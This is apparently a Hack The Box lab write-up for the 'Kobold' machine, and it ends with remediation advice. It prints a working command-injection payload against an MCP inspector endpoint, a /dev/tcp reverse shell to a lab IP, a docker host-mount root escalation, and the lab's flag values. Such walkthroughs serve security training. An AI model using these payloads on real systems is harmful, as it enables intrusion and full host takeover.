---
title: Kobold - Full Walkthrough (HTB)
author: G10D
date: 2026-03-26 20:00:00 +0800
categories: [HackTheBox, Machine]
tags: [linux, rce, docker, privilege-escalation, web]
render_with_liquid: false
---

## 🧠 Overview

**Kobold** is a medium-difficulty Linux machine that demonstrates a modern attack chain involving:

- Exposed development tools
- Remote Code Execution (RCE)
- Misconfigured container environments
- Docker privilege escalation

The attack starts with exploiting an exposed MCP (Model Context Protocol) debugging service and ends with full root compromise via Docker abuse.

---

## 🎯 Attack Chain Summary

1. **Recon → Subdomain discovery**
2. **Exploit MCPJam Inspector → RCE**
3. **Initial shell as `ben`**
4. **Privilege escalation via Docker group**
5. **Root compromise via container escape**

---

## 🔍 1. Reconnaissance

### 🔹 Port Scan

```bash
nmap -sC -sV -p- -T4 --min-rate 5000 -oA kobold $TARGET
````

### Key Findings

| Port | Service | Notes                                  |
| ---- | ------- | -------------------------------------- |
| 22   | SSH     | Standard                               |
| 80   | HTTP    | Redirect to HTTPS                      |
| 443  | HTTPS   | Main web app                           |
| 3552 | HTTP    | Golang service (Arcane / Docker panel) |

---

## 🌐 2. Virtual Host Discovery

TLS certificate reveals:

```text
*.kobold.htb
```

Add to `/etc/hosts`:

```bash
10.129.X.X kobold.htb mcp.kobold.htb bin.kobold.htb
```

---

### 🔹 Subdomains

* `kobold.htb` → Main panel
* `mcp.kobold.htb` → MCPJam Inspector
* `bin.kobold.htb` → PrivateBin

---

## ⚡ 3. Initial Access — RCE (CVE-2026-23744)

### 🔥 Vulnerable Service

```
https://mcp.kobold.htb
```

This service exposes:

```http
POST /api/mcp/connect
```

---

### 🧠 Vulnerability

The endpoint allows user-controlled input:

```json
{
  "serverId": "...",
  "serverConfig": {
    "command": "...",
    "args": [...]
  }
}
```

Internally executed as:

```js
child_process.spawn(command, args)
```

👉 **No authentication + no sanitization = RCE**

---

### 🚀 Proof of Concept

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverId": "pwn",
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "id"]
  }
}'
```

---

### 💥 Reverse Shell

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverId": "pwn",
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.15.182/4444 0>&1"]
  }
}'
```

Listener:

```bash
nc -lvnp 4444
```

---

### 🧑‍💻 Shell Access

```bash
whoami
# ben
```

---

## 🏁 4. User Flag

```bash
cd ~
cat user.txt
```

```
dbddf7e7b1af1efd06f022a5df171359
```

---

## 🔐 5. Privilege Escalation — Docker Abuse

### 🔍 Check Groups

```bash
id
```

Output:

```text
groups=1001(ben),37(operator)
```

---

### ⚠️ Hidden Privilege

Activate Docker group:

```bash
newgrp docker
```

```bash
id
# now includes docker
```

---

## 🧠 Why This Works

Being in the `docker` group = **root equivalent access**

Because Docker allows:

```text
Mount host filesystem → execute commands → full control
```

---

## 🐳 6. Docker Exploitation

### 🔍 Check Local Images

```bash
docker images
```

Available:

* `mysql:latest`
* `privatebin/nginx-fpm-alpine`

---

### 💣 Exploit

```bash
docker run --rm -v /:/host --entrypoint /bin/bash mysql:latest \
-c 'id; ls -la /host/root; cat /host/root/root.txt'
```

---

### 💥 Output

```bash
uid=0(root)
```

```
8f2d05ca1431709a619203ac6dcd4410
```

---

## 👑 7. Root Flag

```text
8f2d05ca1431709a619203ac6dcd4410
```

---

## 🧩 Key Takeaways

### 🔥 1. Exposed Developer Tools = Critical Risk

* MCPJam Inspector was meant for local debugging
* Exposing it publicly leads to **instant RCE**

---

### 🔥 2. Input Validation Failure

```js
spawn(command, args)
```

Without sanitization = game over.

---

### 🔥 3. Docker Group = Root

```text
docker ≈ root
```

Even without sudo access.

---

### 🔥 4. Offline Environment Consideration

* Could not pull images from Docker Hub
* Used **existing local images**

👉 Important real-world scenario

---

## 🛡️ Remediation

### 1. Secure MCP Services

* Require authentication
* Disable in production

### 2. Validate Input

* Never pass user input to system commands

### 3. Restrict Docker Access

* Remove users from docker group
* Use rootless containers

### 4. Network Segmentation

* Do not expose internal tools publicly

---

## 🏁 Conclusion

Kobold demonstrates how:

* A **single exposed service** can lead to full compromise
* Combined with **weak container isolation**, attackers can escalate quickly

---

## 🔗 Skills Practiced

* Web enumeration
* Subdomain discovery
* Exploit development
* Reverse shells
* Linux privilege escalation
* Docker abuse techniques

---
